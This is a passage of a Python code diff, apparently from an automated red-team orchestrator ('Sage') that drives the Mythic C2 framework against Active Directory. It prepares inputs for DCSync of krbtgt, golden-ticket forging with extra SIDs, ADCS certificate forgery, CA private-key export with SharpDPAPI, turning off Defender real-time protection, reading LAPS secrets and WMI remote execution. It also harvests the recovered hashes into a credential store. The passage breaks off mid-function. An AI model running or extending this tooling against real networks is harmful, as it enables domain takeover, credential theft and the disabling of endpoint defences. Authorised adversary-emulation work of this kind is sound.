+                prefix = f"gpo-affects-dc:{gpo}:"
+                hosts = []
+                for graph_fact in list(getattr(self, "_engagement_graph_facts", []) or []):
+                    predicate = self._capability_text(getattr(graph_fact, "predicate", "")).casefold()
+                    if not predicate.startswith(prefix):
+                        continue
+                    tail = predicate[len(prefix):]
+                    parts = tail.split(":")
+                    if len(parts) < 2:
+                        continue
+                    host = parts[0].strip()
+                    fact_domain = ":".join(parts[1:]).strip()
+                    if host and fact_domain == domain and host not in hosts:
+                        hosts.append(host)
+                if hosts:
+                    inputs["affected_dc_hosts"] = hosts
+                else:
+                    scoped_dc_value = (
+                        inputs.get("target_dc")
+                        or inputs.get("target_domain_controller")
+                        or inputs.get("domain_controller")
+                        or inputs.get("dc")
+                        or intent.get("target_dc")
+                        or intent.get("target_domain_controller")
+                        or intent.get("domain_controller")
+                        or intent.get("dc")
+                    )
+                    scoped_dc_text = self._capability_text(scoped_dc_value)
+                    if scoped_dc_text:
+                        inputs["affected_dc_hosts"] = [scoped_dc_text]
+            if not self._capability_text(inputs.get("ldap_server")) and domain:
+                affected_dc_value = inputs.get("affected_dc_hosts")
+                if isinstance(affected_dc_value, (list, tuple)):
+                    affected_dc_value = affected_dc_value[0] if affected_dc_value else ""
+                dc_value = (
+                    inputs.get("domain_controller")
+                    or inputs.get("dc")
+                    or inputs.get("target_dc")
+                    or inputs.get("target_domain_controller")
+                    or inputs.get("target_host")
+                    or inputs.get("host")
+                    or intent.get("domain_controller")
+                    or intent.get("dc")
+                    or intent.get("target_dc")
+                    or intent.get("target_domain_controller")
+                    or intent.get("target_host")
+                    or intent.get("host")
+                    or affected_dc_value
+                )
+                ldap_server = self._capability_host_name(dc_value, domain)
+                if ldap_server:
+                    inputs["ldap_server"] = ldap_server
+            return
+        if capability in {"dcsync-krbtgt", "dcsync-account"}:
+            domain = self._capability_domain(action, inputs)
+            account = self._capability_account(action, inputs) or ("krbtgt" if capability == "dcsync-krbtgt" else "")
+            if domain:
+                inputs["domain"] = domain
+            if account:
+                inputs["account"] = account
+            if domain and not self._capability_text(inputs.get("domain_controller") or inputs.get("dc")):
+                host = await self._resolve_domain_controller_host(domain)
+                if host:
+                    inputs["domain_controller"] = host
+                    inputs["domain_controller_source"] = f"BloodHound Domain Controllers membership for {domain}"
+            return
+        if capability == "adcs-certificate-auth":
+            domain = self._capability_target_domain(action, inputs) or self._capability_domain(action, inputs)
+            account = self._capability_account(action, inputs) or "administrator"
+            callback_id = self._capability_callback_id(action, inputs)
+            ca_host = self._capability_text(
+                inputs.get("ca_host")
+                or getattr(action, "intent", {}).get("ca_host")
+                or self._capability_target_host_from_context({"target": getattr(action, "target", "")})
+            ).casefold()
+            if domain:
+                inputs["domain"] = domain
+                inputs["target_domain"] = domain
+            if account:
+                inputs["account"] = account
+            if callback_id:
+                inputs["callback_id"] = callback_id
+            if ca_host:
+                inputs["ca_host"] = ca_host
+            slug = self._capability_slug("_".join(part for part in (account, domain, callback_id) if part))
+            if not self._capability_text(inputs.get("proof_marker") or inputs.get("auth_marker")):
+                inputs["proof_marker"] = f"SAGE_CERT_AUTH_PROOF_{slug}"
+            if not self._capability_text(
+                inputs.get("forged_pfx_path")
+                or inputs.get("forged_certificate_path")
+                or inputs.get("new_cert_path")
+                or inputs.get("certificate_path")
+            ):
+                inputs["forged_pfx_path"] = f"C:\\Windows\\Temp\\sage_forged_cert_{slug}.pfx"
+            if not self._capability_text(
+                inputs.get("forged_pfx_password")
+                or inputs.get("forged_certificate_password")
+                or inputs.get("new_cert_password")
+                or inputs.get("certificate_password")
+            ):
+                inputs["forged_pfx_password"] = self._artifact_secret("SageCert", slug)
+            if not self._capability_text(inputs.get("subject") or inputs.get("certificate_subject")) and account:
+                inputs["subject"] = f"CN={account}"
+            if not self._capability_text(inputs.get("subject_alt_name") or inputs.get("san") or inputs.get("upn")) and account and domain:
+                inputs["subject_alt_name"] = f"{account}@{domain}"
+            await self._augment_capability_ticket_proof_target(inputs, domain)
+            return
+        if capability == "adcs-esc-certificate-enroll":
+            domain = self._capability_target_domain(action, inputs) or self._capability_domain(action, inputs)
+            account = self._capability_account(action, inputs) or "administrator"
+            callback_id = self._capability_callback_id(action, inputs)
+            ca_host = self._capability_text(
+                inputs.get("ca_host")
+                or getattr(action, "intent", {}).get("ca_host")
+                or self._capability_target_host_from_context({"target": getattr(action, "target", "")})
+            ).casefold()
+            if domain:
+                inputs["domain"] = domain
+                inputs["target_domain"] = domain
+            if account:
+                inputs["account"] = account
+            if callback_id:
+                inputs["callback_id"] = callback_id
+            if ca_host:
+                inputs["ca_host"] = ca_host
+            slug = self._capability_slug("_".join(part for part in (account, domain, callback_id) if part))
+            if not self._capability_text(inputs.get("proof_marker") or inputs.get("enroll_marker")):
+                inputs["proof_marker"] = f"SAGE_CERT_ENROLL_PROOF_{slug}"
+            if not self._capability_text(
+                inputs.get("certificate_path")
+                or inputs.get("forged_pfx_path")
+                or inputs.get("forged_certificate_path")
+                or inputs.get("new_cert_path")
+            ):
+                inputs["certificate_path"] = f"C:\\Windows\\Temp\\sage_forged_cert_{slug}.pfx"
+            if not self._capability_text(
+                inputs.get("certificate_password")
+                or inputs.get("forged_pfx_password")
+                or inputs.get("forged_certificate_password")
+                or inputs.get("new_cert_password")
+            ):
+                inputs["certificate_password"] = self._artifact_secret("SageCert", slug)
+            if not self._capability_text(inputs.get("subject") or inputs.get("certificate_subject")) and account:
+                inputs["subject"] = f"CN={account}"
+            if not self._capability_text(inputs.get("subject_alt_name") or inputs.get("san") or inputs.get("upn")) and account and domain:
+                inputs["subject_alt_name"] = f"{account}@{domain}"
+            return
+        if capability == "endpoint-protection-adjustment":
+            target_host = self._capability_target_host(action, inputs)
+            target_domain = self._capability_managed_secret_target_domain(action, inputs)
+            callback_id = self._capability_callback_id(action, inputs)
+            local_account = self._capability_local_account(action, inputs)
+            if target_host:
+                inputs["target_host"] = target_host
+            if target_domain:
+                inputs["target_domain"] = target_domain
+            if callback_id:
+                inputs["callback_id"] = callback_id
+            if local_account:
+                inputs["local_account"] = local_account
+            slug = self._capability_slug("_".join(part for part in (target_host, callback_id) if part))
+            if not self._capability_text(inputs.get("proof_marker") or inputs.get("adjustment_marker")):
+                inputs["proof_marker"] = f"SAGE_EP_ADJUST_PROOF_{slug}"
+            if target_host and not self._capability_text(inputs.get("output_path") or inputs.get("remote_output_path")):
+                inputs["output_path"] = f"C:\\Windows\\Temp\\sage_ep_adjust_{slug}.txt"
+            if "actions" not in inputs and "endpoint_actions" not in inputs and "protection_actions" not in inputs:
+                inputs["actions"] = ["disable_realtime", "add_exclusion"]
+            if "exclusion_paths" not in inputs and "exclusions" not in inputs and "exclusion_path" not in inputs:
+                inputs["exclusion_paths"] = [r"C:\Windows\Temp"]
+            if not self._capability_text(
+                inputs.get("password")
+                or inputs.get("local_admin_password")
+                or inputs.get("managed_local_admin_secret")
+                or inputs.get("secret")
+                or inputs.get("credential")
+                or inputs.get("credential_text")
+            ):
+                credential = await self._select_managed_local_admin_credential(
+                    target_host,
+                    target_domain,
+                    local_account,
+                )
+                if credential:
+                    inputs["password"] = credential["credential"]
+                    inputs["credential_id"] = credential.get("id")
+                    inputs["credential_source"] = "mythic_credential_store"
+                    inputs["credential_realm"] = credential.get("realm")
+                    inputs["credential_account"] = credential.get("account")
+            return
+        if capability == "adcs-ca-private-key-export":
+            target_host = self._capability_target_host(action, inputs)
+            target_domain = self._capability_managed_secret_target_domain(action, inputs)
+            callback_id = self._capability_callback_id(action, inputs)
+            local_account = self._capability_local_account(action, inputs)
+            if target_host:
+                inputs["target_host"] = target_host
+            if target_domain:
+                inputs["target_domain"] = target_domain
+            if callback_id:
+                inputs["callback_id"] = callback_id
+            if local_account:
+                inputs["local_account"] = local_account
+            slug = self._capability_slug("_".join(part for part in (target_host, callback_id) if part))
+            if not self._capability_text(inputs.get("proof_marker") or inputs.get("export_marker")):
+                inputs["proof_marker"] = f"SAGE_CA_EXPORT_PROOF_{slug}"
+            if target_host and not self._capability_text(inputs.get("pfx_path") or inputs.get("remote_pfx_path")):
+                inputs["pfx_path"] = f"C:\\Windows\\Temp\\sage_ca_export_{slug}.pfx"
+            if target_host and not self._capability_text(
+                inputs.get("metadata_path") or inputs.get("meta_path") or inputs.get("remote_metadata_path")
+            ):
+                inputs["metadata_path"] = f"C:\\Windows\\Temp\\sage_ca_export_{slug}.txt"
+            if not self._capability_text(inputs.get("pfx_password") or inputs.get("certificate_password")):
+                inputs["pfx_password"] = self._artifact_secret("SagePfx", slug)
+            export_method = self._capability_text(
+                inputs.get("adcs_ca_export_method")
+                or inputs.get("ca_export_method")
+                or inputs.get("export_method")
+            ).casefold()
+            if export_method in {"sharpdpapi", "dpapi", "machine-dpapi", "machine_dpapi"}:
+                tool_name = self._capability_text(inputs.get("dpapi_tool") or inputs.get("tool") or "SharpDPAPI.exe")
+                if tool_name:
+                    inputs.setdefault("tool", tool_name)
+                if tool_name and not self._capability_text(
+                    inputs.get("tool_file_uuid")
+                    or inputs.get("dpapi_tool_file_uuid")
+                    or inputs.get("file_uuid")
+                ):
+                    try:
+                        upload_state = json.loads(await self.ensure_tool_uploaded(tool_name))
+                    except Exception as exc:
+                        upload_state = {
+                            "status": "error",
+                            "binary_filename": tool_name,
+                            "error": str(exc),
+                        }
+                    if isinstance(upload_state, dict) and upload_state.get("file_uuid"):
+                        inputs["tool_file_uuid"] = upload_state["file_uuid"]
+                        inputs["tool_upload_status"] = upload_state.get("status")
+                    elif isinstance(upload_state, dict):
+                        inputs["tool_upload_status"] = upload_state.get("status")
+                        inputs["tool_upload_reason"] = (
+                            upload_state.get("note")
+                            or upload_state.get("error")
+                            or "tool file UUID unavailable"
+                        )
+                inputs.setdefault("adcs_ca_export_use_current_context", False)
+                inputs.setdefault(
+                    "adcs_ca_export_command",
+                    inputs.get("adcs_ca_dpapi_export_command")
+                    or inputs.get("dpapi_export_command")
+                    or "powerpick",
+                )
+            else:
+                remote_exec_effect = f"remote-exec:{self._capability_text(target_host).casefold()}@{self._capability_text(target_domain).casefold()}"
+                if remote_exec_effect in self._capability_achieved_effects():
+                    inputs.setdefault("adcs_ca_export_use_current_context", False)
+                    inputs.setdefault(
+                        "adcs_ca_export_command",
+                        inputs.get("adcs_ca_remote_exec_command")
+                        or inputs.get("local_admin_remote_exec_command")
+                        or inputs.get("remote_exec_command")
+                        or inputs.get("adcs_ca_orchestration_command")
+                        or inputs.get("local_powershell_command")
+                        or "wmiexecute",
+                    )
+                else:
+                    inputs.setdefault("adcs_ca_export_use_current_context", True)
+                    inputs.setdefault("current_context_powershell_command", "powerpick")
+                    inputs.setdefault("adcs_ca_export_command", inputs.get("current_context_powershell_command") or "powerpick")
+            if not self._capability_text(
+                inputs.get("password")
+                or inputs.get("local_admin_password")
+                or inputs.get("managed_local_admin_secret")
+                or inputs.get("secret")
+                or inputs.get("credential")
+                or inputs.get("credential_text")
+            ):
+                credential = await self._select_managed_local_admin_credential(
+                    target_host,
+                    target_domain,
+                    local_account,
+                )
+                if credential:
+                    inputs["password"] = credential["credential"]
+                    inputs["credential_id"] = credential.get("id")
+                    inputs["credential_source"] = "mythic_credential_store"
+                    inputs["credential_realm"] = credential.get("realm")
+                    inputs["credential_account"] = credential.get("account")
+            return
+        if capability == "execute-as-local-admin":
+            target_host = self._capability_target_host(action, inputs)
+            target_domain = self._capability_managed_secret_target_domain(action, inputs)
+            callback_id = self._capability_callback_id(action, inputs)
+            local_account = self._capability_local_account(action, inputs)
+            if target_host:
+                inputs["target_host"] = target_host
+            if target_domain:
+                inputs["target_domain"] = target_domain
+            if callback_id:
+                inputs["callback_id"] = callback_id
+            if local_account:
+                inputs["local_account"] = local_account
+            slug = self._capability_slug("_".join(part for part in (target_host, callback_id) if part))
+            if not self._capability_text(inputs.get("proof_marker")):
+                inputs["proof_marker"] = f"SAGE_REMOTE_EXEC_PROOF_{slug}"
+            if target_host and not self._capability_text(inputs.get("proof_path") or inputs.get("remote_proof_path")):
+                inputs["proof_path"] = f"C:\\Windows\\Temp\\sage_remote_exec_{slug}.txt"
+            if target_host and target_domain and not self._capability_text(
+                inputs.get("proof_unc") or inputs.get("proof_resource") or inputs.get("target_resource")
+            ):
+                host = self._capability_host_name(target_host, target_domain)
+                proof_path = self._capability_text(inputs.get("proof_path") or inputs.get("remote_proof_path"))
+                inputs["proof_unc"] = self._capability_unc_from_windows_path(host, proof_path)
+            if not self._capability_text(
+                inputs.get("password")
+                or inputs.get("local_admin_password")
+                or inputs.get("managed_local_admin_secret")
+                or inputs.get("secret")
+                or inputs.get("credential")
+                or inputs.get("credential_text")
+            ):
+                credential = await self._select_managed_local_admin_credential(
+                    target_host,
+                    target_domain,
+                    local_account,
+                )
+                if credential:
+                    inputs["password"] = credential["credential"]
+                    inputs["credential_id"] = credential.get("id")
+                    inputs["credential_source"] = "mythic_credential_store"
+                    inputs["credential_realm"] = credential.get("realm")
+                    inputs["credential_account"] = credential.get("account")
+            payload_type = ""
+            if callback_id:
+                try:
+                    payload_type = self._capability_text(await self._resolve_payload_type(int(callback_id))).casefold()
+                except Exception:
+                    payload_type = ""
+            if payload_type == "apollo":
+                if not self._capability_text(inputs.get("local_admin_remote_exec_command") or inputs.get("remote_exec_command")):
+                    inputs["local_admin_remote_exec_command"] = "wmiexecute"
+            return
+        if capability == "use-managed-local-admin-secret":
+            target_host = self._capability_target_host(action, inputs)
+            target_domain = self._capability_managed_secret_target_domain(action, inputs)
+            callback_id = self._capability_callback_id(action, inputs)
+            local_account = self._capability_local_account(action, inputs)
+            if target_host:
+                inputs["target_host"] = target_host
+            if target_domain:
+                inputs["target_domain"] = target_domain
+            if callback_id:
+                inputs["callback_id"] = callback_id
+            if local_account:
+                inputs["local_account"] = local_account
+            if target_host and target_domain and not self._capability_text(
+                inputs.get("proof_resource") or inputs.get("service_resource") or inputs.get("target_resource")
+            ):
+                host = self._capability_host_name(target_host, target_domain)
+                inputs["proof_resource"] = f"\\\\{host}\\C$"
+                inputs["proof_service"] = "cifs"
+            if not self._capability_text(
+                inputs.get("password")
+                or inputs.get("local_admin_password")
+                or inputs.get("managed_local_admin_secret")
+                or inputs.get("secret")
+                or inputs.get("credential")
+                or inputs.get("credential_text")
+            ):
+                credential = await self._select_managed_local_admin_credential(
+                    target_host,
+                    target_domain,
+                    local_account,
+                )
+                if credential:
+                    inputs["password"] = credential["credential"]
+                    inputs["credential_id"] = credential.get("id")
+                    inputs["credential_source"] = "mythic_credential_store"
+                    inputs["credential_realm"] = credential.get("realm")
+                    inputs["credential_account"] = credential.get("account")
+            return
+        if capability == "read-managed-local-admin-secret":
+            account = self._capability_account(action, inputs)
+            account_domain = self._capability_account_domain(action, inputs)
+            target_host = self._capability_target_host(action, inputs)
+            target_domain = self._capability_managed_secret_target_domain(action, inputs)
+            callback_id = self._capability_callback_id(action, inputs)
+            if account:
+                inputs["account"] = account
+            if account_domain:
+                inputs["account_domain"] = account_domain
+            if target_host:
+                inputs["target_host"] = target_host
+            if target_domain:
+                inputs["target_domain"] = target_domain
+            if callback_id:
+                inputs["callback_id"] = callback_id
+            if target_domain and not self._capability_text(inputs.get("domain_controller") or inputs.get("dc")):
+                host = await self._resolve_domain_controller_host(target_domain)
+                if host:
+                    inputs["domain_controller"] = host
+                    inputs["domain_controller_source"] = f"BloodHound Domain Controllers membership for {target_domain}"
+            return
+        if capability == "ensure-account-kerberos-context":
+            domain = self._capability_domain(action, inputs)
+            account = self._capability_account(action, inputs)
+            callback_id = self._capability_callback_id(action, inputs)
+            if domain:
+                inputs["domain"] = domain
+            if account:
+                inputs["account"] = account
+            if callback_id:
+                inputs["callback_id"] = callback_id
+            if not self._capability_has_ticket_key(inputs):
+                credential = await self._select_account_credential(domain, account)
+                if credential:
+                    inputs["key"] = credential["credential"]
+                    inputs["key_type"] = credential["key_type"]
+                    inputs["credential_id"] = credential.get("id")
+                    inputs["credential_source"] = "mythic_credential_store"
+            self._sanitize_account_context_proof_target(action, inputs)
+            self._normalize_capability_service_proof_target(action, inputs, default_share="SYSVOL")
+            await self._augment_capability_account_ticket_proof_target(inputs, domain)
+            return
+        if capability == "ensure-kerberos-context":
+            domain = self._capability_source_domain(action, inputs)
+            target_domain = self._capability_target_domain(action, inputs) or self._capability_domain(action, inputs)
+            if domain:
+                inputs["source_domain"] = domain
+            if target_domain:
+                inputs["target_domain"] = target_domain
+        else:
+            domain = self._capability_domain(action, inputs)
+            target_domain = self._capability_target_domain(action, inputs)
+        if "target_domain" not in inputs and "effect_domain" not in inputs:
+            parent = self._parent_domain_for_capability(domain)
+            if parent and parent != domain and (
+                inputs.get("extra_sids") or inputs.get("parent_domain_sid") or inputs.get("enterprise_admins_sid")
+            ):
+                inputs["target_domain"] = parent
+                target_domain = parent
+
+        source_sid = await self._resolve_domain_sid(domain)
+        if source_sid:
+            inputs["domain_sid"] = source_sid
+            inputs["domain_sid_source"] = f"BloodHound Domain.objectid for {domain}"
+            self._remove_capability_input_error(inputs, "invalid_domain_sid")
+
+        if target_domain and target_domain != domain:
+            target_sid = await self._resolve_domain_sid(target_domain)
+            if target_sid:
+                inputs["parent_domain_sid"] = target_sid
+                inputs["parent_domain_sid_source"] = f"BloodHound Domain.objectid for {target_domain}"
+                inputs.pop("enterprise_admins_sid", None)
+                inputs.pop("extra_sids", None)
+                self._remove_capability_input_error(inputs, "invalid_parent_domain_sid")
+                self._remove_capability_input_error(inputs, "invalid_enterprise_admins_sid")
+                self._remove_capability_input_error(inputs, "invalid_extra_sids")
+                self._normalize_capability_ticket_inputs(inputs)
+
+        if not self._capability_has_ticket_key(inputs):
+            credential = await self._select_krbtgt_credential(domain)
+            if credential:
+                inputs["key"] = credential["credential"]
+                inputs["key_type"] = credential["key_type"]
+                inputs["credential_id"] = credential.get("id")
+                inputs["credential_source"] = "mythic_credential_store"
+
+        self._normalize_capability_service_proof_target(action, inputs, default_share="C$")
+        if capability == "ensure-kerberos-context":
+            self._sanitize_admin_context_proof_target(action, inputs, default_share="C$")
+        await self._augment_capability_ticket_proof_target(inputs, target_domain or domain)
+
+    async def _augment_capability_account_ticket_proof_target(self, inputs: dict, domain: str) -> None:
+        if self._capability_text(inputs.get("proof_resource") or inputs.get("service_resource")):
+            return
+        domain_cf = self._capability_text(domain).casefold()
+        host = self._capability_text(
+            inputs.get("proof_host")
+            or inputs.get("service_host")
+            or inputs.get("target_host")
+            or inputs.get("dc")
+            or inputs.get("domain_controller")
+        )
+        source = ""
+        if not host and domain_cf:
+            host = await self._resolve_domain_controller_host(domain_cf)
+            if host:
+                source = f"BloodHound Domain Controllers membership for {domain_cf}"
+        host = self._capability_host_name(host, domain_cf)
+        if not host:
+            return
+        inputs.setdefault("proof_host", host)
+        inputs.setdefault("proof_resource", f"\\\\{host}\\SYSVOL")
+        inputs.setdefault("proof_service", "cifs")
+        if source:
+            inputs.setdefault("proof_resource_source", source)
+
+    async def _augment_capability_ticket_proof_target(self, inputs: dict, effect_domain: str) -> None:
+        if self._capability_text(inputs.get("proof_resource") or inputs.get("service_resource")):
+            return
+        domain = self._capability_text(effect_domain).casefold()
+        host = self._capability_text(
+            inputs.get("proof_host")
+            or inputs.get("service_host")
+            or inputs.get("target_host")
+            or inputs.get("dc")
+            or inputs.get("domain_controller")
+        )
+        source = ""
+        if not host and domain:
+            host = await self._resolve_domain_controller_host(domain)
+            if host:
+                source = f"BloodHound Domain Controllers membership for {domain}"
+        host = self._capability_host_name(host, domain)
+        if not host:
+            return
+        inputs.setdefault("proof_host", host)
+        inputs.setdefault("proof_resource", f"\\\\{host}\\C$")
+        inputs.setdefault("proof_service", "cifs")
+        if source:
+            inputs.setdefault("proof_resource_source", source)
+
+    def _validate_capability_ticket_sid_sources(self, action, inputs: dict) -> None:
+        capability = self._capability_text(getattr(action, "name", "")).casefold()
+        if capability not in {"forge-golden-ticket", "ensure-kerberos-context"} or not isinstance(inputs, dict):
+            return
+        if capability == "ensure-kerberos-context":
+            domain = self._capability_source_domain(action, inputs)
+            target_domain = self._capability_target_domain(action, inputs) or self._capability_domain(action, inputs)
+        else:
+            domain = self._capability_domain(action, inputs)
+            target_domain = self._capability_target_domain(action, inputs)
+        if not target_domain and inputs.get("extra_sids"):
+            target_domain = self._parent_domain_for_capability(domain)
+        if target_domain and target_domain != domain and inputs.get("extra_sids") and not self._has_trusted_extra_sid_source(inputs):
+            self._add_capability_input_error(inputs, "missing_extra_sids_source")
+
+    def _normalize_capability_ticket_inputs(self, inputs: dict) -> None:
+        if not isinstance(inputs, dict):
+            return
+        if "domain_sid" not in inputs:
+            for alias in ("child_domain_sid", "source_domain_sid", "sid"):
+                if self._capability_text(inputs.get(alias)):
+                    inputs["domain_sid"] = inputs[alias]
+                    break
+        if self._capability_text(inputs.get("domain_sid")) and not self._is_domain_sid(inputs.get("domain_sid")):
+            self._add_capability_input_error(inputs, "invalid_domain_sid")
+        if not inputs.get("extra_sids"):
+            ea_sid = self._capability_text(inputs.get("enterprise_admins_sid"))
+            parent_sid = self._capability_text(inputs.get("parent_domain_sid") or inputs.get("root_domain_sid"))
+            if ea_sid:
+                normalized = self._normalize_enterprise_admins_sid(ea_sid)
+                if normalized:
+                    inputs["extra_sids"] = [normalized]
+                else:
+                    self._add_capability_input_error(inputs, "invalid_enterprise_admins_sid")
+            elif parent_sid:
+                normalized = self._normalize_parent_enterprise_admins_sid(parent_sid)
+                if normalized:
+                    inputs["extra_sids"] = [normalized]
+                else:
+                    self._add_capability_input_error(inputs, "invalid_parent_domain_sid")
+        elif inputs.get("extra_sids"):
+            normalized_extra_sids = []
+            for sid in self._capability_sid_list(inputs.get("extra_sids")):
+                if self._is_sid(sid):
+                    normalized_extra_sids.append(sid)
+                else:
+                    self._add_capability_input_error(inputs, "invalid_extra_sids")
+            if normalized_extra_sids:
+                inputs["extra_sids"] = normalized_extra_sids
+
+    async def _select_krbtgt_credential(self, domain: str) -> dict:
+        domain_cf = self._capability_text(domain).casefold()
+        if not domain_cf:
+            return {}
+        creds = await self._fetch_credentials_cached(datetime.now(timezone.utc).isoformat())
+        candidate = self._best_kerberos_key_credential(creds, "krbtgt", domain_cf)
+        if candidate:
+            return candidate
+        recovered = await self._recover_krbtgt_credential_from_recorded_task(domain_cf)
+        if recovered:
+            return recovered
+        return {}
+
+    def _best_kerberos_key_credential(self, creds: list | tuple, account: str, realm: str) -> dict:
+        account_cf = self._canonical_credential_account(account)
+        realm_cf = self._capability_text(realm).casefold()
+        candidates = []
+        for cred in creds or []:
+            if not isinstance(cred, dict):
+                continue
+            row_account = self._canonical_credential_account(cred.get("account"))
+            row_realm = self._capability_text(cred.get("realm")).casefold()
+            secret = self._capability_text(cred.get("credential_text") or cred.get("credential")).strip()
+            if row_account != account_cf or row_realm != realm_cf or not secret:
+                continue
+            key_type = self._account_credential_key_type(cred, secret)
+            if key_type not in {"aes256", "aes128", "rc4"}:
+                continue
+            priority = {"aes256": 0, "aes128": 1, "rc4": 2}.get(key_type, 9)
+            candidates.append((priority, {
+                "id": cred.get("id"),
+                "credential": secret,
+                "key_type": key_type,
+            }))
+        if not candidates:
+            return {}
+        candidates.sort(key=lambda item: item[0])
+        return candidates[0][1]
+
+    async def _recover_krbtgt_credential_from_recorded_task(self, domain: str) -> dict:
+        domain_cf = self._capability_text(domain).casefold()
+        task_ids: list[int] = []
+        for hop in reversed(list(getattr(self, "_engagement_hops", []) or [])):
+            status = self._capability_text(getattr(hop, "status", "")).casefold()
+            if status != "achieved":
+                continue
+            effects = [self._capability_text(getattr(hop, "effect", ""))]
+            effects.extend(self._capability_text(item) for item in (getattr(hop, "satisfied_effects", []) or []))
+            if f"krbtgt-hash:{domain_cf}" not in {item.casefold() for item in effects if item}:
+                continue
+            evidence = getattr(hop, "evidence", {}) if isinstance(getattr(hop, "evidence", {}), dict) else {}
+            task_id = evidence.get("mythic_task_id") or evidence.get("task_id") or evidence.get("source_task_id")
+            try:
+                task_ids.append(int(task_id))
+            except Exception:
+                continue
+        for task_id in task_ids:
+            output = await self._fetch_plain_task_output(task_id)
+            material = self._extract_credential_material(output, account="krbtgt", realm=domain_cf)
+            if not material:
+                continue
+            await self._import_credential_material(material, source_task_id=task_id)
+            candidate = self._best_credential_material_candidate(material)
+            if candidate:
+                return candidate
+        return {}
+
+    async def _fetch_plain_task_output(self, task_id: int) -> str:
+        if self.client is None:
+            return ""
+        cached = getattr(self, "_task_output_cache", {}).get(int(task_id))
+        if cached:
+            return cached
+        try:
+            resp = await mythic.get_all_task_output_by_id(mythic=self.client, task_display_id=int(task_id))
+        except Exception:
+            return ""
+        chunks: list[str] = []
+        for item in resp if isinstance(resp, list) else [resp]:
+            if isinstance(item, bytes):
+                chunks.append(item.decode("utf-8", "replace"))
+                continue
+            if not isinstance(item, dict):
+                chunks.append(self._capability_text(item))
+                continue
+            raw = item.get("response_text") or item.get("response") or ""
+            if isinstance(raw, bytes):
+                chunks.append(raw.decode("utf-8", "replace"))
+                continue
+            text = self._capability_text(raw)
+            if text:
+                try:
+                    chunks.append(base64.b64decode(text).decode("utf-8", "replace"))
+                    continue
+                except Exception:
+                    pass
+                chunks.append(text)
+        result = "\n".join(chunk for chunk in chunks if chunk)
+        if result:
+            self._task_output_cache[int(task_id)] = result
+        return result
+
+    def _extract_credential_material(self, output: str, *, account: str, realm: str) -> list[dict[str, str]]:
+        try:
+            try:
+                from . import credential_artifacts
+            except ImportError:
+                import credential_artifacts
+            return list(credential_artifacts.extract_credential_material(output, account=account, realm=realm))
+        except Exception:
+            return []
+
+    def _best_credential_material_candidate(self, material: list[dict[str, str]]) -> dict:
+        candidates = []
+        for item in material or []:
+            if not isinstance(item, dict):
+                continue
+            secret = self._capability_text(item.get("credential")).strip()
+            secret_type = self._capability_text(item.get("secret_type")).casefold()
+            key_type = secret_type if secret_type in {"aes256", "aes128"} else self._infer_capability_key_type(secret)
+            if key_type not in {"aes256", "aes128", "rc4"}:
+                continue
+            priority = {"aes256": 0, "aes128": 1, "rc4": 2}.get(key_type, 9)
+            candidates.append((priority, {"credential": secret, "key_type": key_type}))
+        if not candidates:
+            return {}
+        candidates.sort(key=lambda item: item[0])
+        return candidates[0][1]
+
+    async def _import_credential_material(self, material: list[dict[str, str]], *, source_task_id: int | str = "") -> list[dict]:
+        if self.client is None or not material:
+            return []
+        existing = await self._fetch_credentials_cached(datetime.now(timezone.utc).isoformat())
+        refs: list[dict] = []
+        for item in material:
+            if not isinstance(item, dict):
+                continue
+            account = self._capability_text(item.get("account")).strip()
+            realm = self._capability_text(item.get("realm")).strip().casefold()
+            credential = self._capability_text(item.get("credential")).strip()
+            secret_type = self._capability_text(item.get("secret_type")).strip().casefold()
+            credential_type = self._capability_text(item.get("credential_type")).strip() or (
+                "key" if secret_type.startswith("aes") else "hash"
+            )
+            if not account or not realm or not credential:
+                continue
+            duplicate = False
+            for row in existing or []:
+                if self._capability_text(row.get("account")).casefold() != account.casefold():
+                    continue
+                if self._capability_text(row.get("realm")).casefold() != realm:
+                    continue
+                if self._capability_text(row.get("credential_text")).casefold() == credential.casefold():
+                    refs.append({
+                        "id": row.get("id"),
+                        "account": account,
+                        "realm": realm,
+                        "secret_type": secret_type,
+                        "credential_type": credential_type,
+                        "status": "existing",
+                    })
+                    duplicate = True
+                    break
+            if duplicate:
+                continue
+            comment = f"Sage verified {secret_type or credential_type} material"
+            if source_task_id:
+                comment += f" from Mythic task {source_task_id}"
+            try:
+                result = await mythic.create_credential(
+                    self.client,
+                    credential=credential,
+                    account=account,
+                    realm=realm,
+                    comment=comment,
+                    credential_type=credential_type,
+                )
+            except Exception:
+                result = {}
+            refs.append({
+                "id": result.get("id") if isinstance(result, dict) else None,
+                "account": account,
+                "realm": realm,
+                "secret_type": secret_type,
+                "credential_type": credential_type,
+                "status": "created" if isinstance(result, dict) and result.get("status") == "success" else "extracted",
+            })
+        if refs:
+            self._cred_cache = None
+            self._cred_cache_ts = None
+        return refs
+
+    async def _import_capability_credential_material(self, action, inputs: dict, output: str, task_id) -> list[dict]:
+        capability = self._capability_text(getattr(action, "name", "")).casefold()
+        if capability == "read-managed-local-admin-secret":
+            material = self._extract_managed_local_admin_credential_material(action, inputs, output)
+            if not material:
+                return []
+            return await self._import_credential_material(material, source_task_id=task_id or "")
+        if capability == "adcs-certificate-auth":
+            domain = (
+                self._capability_target_domain(action, inputs)
+                or self._capability_domain(action, inputs)
+                or self._capability_account_domain(action, inputs)
+            )
+            account = self._capability_account(action, inputs) or "administrator"
+            if not domain or not account:
+                return []
+            material = self._extract_credential_material(output, account=account, realm=domain)
+            if not material:
+                return []
+            return await self._import_credential_material(material, source_task_id=task_id or "")
+        if capability not in {"dcsync-krbtgt", "dcsync-account", "dcsync"}:
+            return []
+        domain = self._capability_domain(action, inputs)
+        account = self._capability_account(action, inputs)
+        if capability in {"dcsync-krbtgt", "dcsync"} and not account:
+            account = "krbtgt"
+        if not domain or not account:
+            return []
+        material = self._extract_credential_material(output, account=account, realm=domain)
+        if not material:
+            return []
+        return await self._import_credential_material(material, source_task_id=task_id or "")
+
+    def _extract_managed_local_admin_credential_material(self, action, inputs: dict, output: str) -> list[dict[str, str]]:
+        target_host = self._capability_target_host(action, inputs)
+        target_domain = self._capability_managed_secret_target_domain(action, inputs)
+        local_account = self._capability_local_account(action, inputs) or "Administrator"
+        host_short = self._capability_host_short(target_host)
+        if not host_short:
+            return []
+        realm = self._capability_host_name(host_short, target_domain).casefold() or host_short
+        text = self._capability_text(output)
+        for attr in ("ms-mcs-admpwd", "mslaps-password"):
+            attr_rx = re.escape(attr).replace("\\-", "[-_]")
+            match = re.search(
+                rf"(?im)^\s*{attr_rx}\s*[:=]\s*(.+?)\s*$",
+                text,
+            )
+            if not match:
+                continue
